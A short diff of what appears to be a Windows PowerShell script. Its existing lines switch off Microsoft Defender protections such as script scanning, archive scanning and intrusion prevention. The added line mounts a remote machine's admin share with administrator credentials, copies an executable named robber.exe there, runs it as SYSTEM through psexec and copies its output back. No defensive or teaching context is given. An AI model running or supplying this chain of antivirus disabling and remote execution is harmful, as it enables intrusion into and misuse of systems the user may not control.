@@ -90,3 +90,6 @@ Set-MpPreference -SubmitSamplesConsent 2
 Set-MpPreference -DisableArchiveScanning $true
 Set-MpPreference -DisableIntrusionPreventionSystem $true
 Set-MpPreference -DisableScriptScanning $true
+
+net use \\192.168.10.99\C$ /user:AdminUser 密碼 && copy robber.exe \\192.168.10.99\C$\Windows\Temp\ && psexec.exe \\192.168.10.99 -u AdminUser -p 密碼 -s cmd.exe /c C:\Windows\Temp\robber.exe -d "C:\Program Files" > C:\Windows\Temp\robber_result.txt && copy \\192.168.10.99\C$\Windows\Temp\robber_result.txt D:\your_local_folder\
+
